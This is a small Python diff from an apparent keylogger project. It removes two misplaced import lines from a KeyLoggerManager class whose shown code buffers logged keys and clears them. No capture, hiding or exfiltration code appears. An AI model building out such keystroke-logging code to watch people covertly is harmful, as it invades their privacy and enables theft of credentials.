@@ -12,8 +12,6 @@ class KeyLoggerManager:
             self.buffer.extend(keys)
             self.keylogger_service.clear_logged_keys()  # פונקציה אופציונלית שתאפס את הלוג
 
-    import threading
-    import time
 
     def start(self):
         self.running = True
